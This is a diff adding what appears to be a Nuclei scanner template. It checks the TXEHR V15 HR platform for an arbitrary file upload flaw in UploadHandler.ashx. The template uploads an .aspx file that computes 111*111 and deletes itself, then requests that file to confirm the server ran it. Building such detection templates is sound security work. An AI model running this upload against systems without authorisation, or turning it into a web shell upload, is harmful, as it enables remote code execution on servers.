@@ -1,0 +1,44 @@
+id: tongxiang-UploadHandler-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 同享软件成立于1997年，运营中心位于东莞南城南新产业国际。专注研发和推广人力资源信息化产品，帮助企业构建统一的人力资源数智化平台，快速提高企业人才管理能力，提升人力资源管理效率，帮助员工快速成长，协助企业实现智慧决策。同享TXEHR V15人力管理管理平台UploadHandler存在任意文件上传漏洞。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%90%8C%E4%BA%AB%E4%BA%BA%E5%8A%9B%E7%AE%A1%E7%90%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0UploadHandler%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+  
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{rand_base(8)}}"
+  
+http:
+  - raw:
+      - |-
+        POST /Handler/UploadHandler.ashx?folder=Uploadfile2 HTTP/1.1
+        Host: {{Hostname}}
+        accept: */*
+        Content-Type: multipart/form-data; boundary=---------------------------{{boundary}}
+        Content-Length: 180
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-User: ?1
+        Te: trailers
+        Connection: close
+
+        -----------------------------{{boundary}}
+        Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.aspx"
+        Content-Type: text/plain
+
+        <%@Page Language="C#"%><% Response.Write(111*111);System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>
+        -----------------------------{{boundary}}--
+      - |-
+        GET /Handler/Uploadfile2/{{filename}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '12321'
